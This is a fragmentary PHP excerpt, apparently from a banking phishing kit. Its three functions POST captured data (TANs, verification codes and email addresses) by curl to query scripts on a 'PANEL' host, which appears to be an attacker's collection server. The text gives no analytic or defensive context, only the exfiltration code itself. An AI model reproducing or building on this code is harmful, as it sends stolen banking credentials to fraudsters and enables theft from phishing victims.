<?php
    ...
    function insert_tan($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_tan.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    ...
    function insert_code($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_code.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    ...
    function insert_email($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_email.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
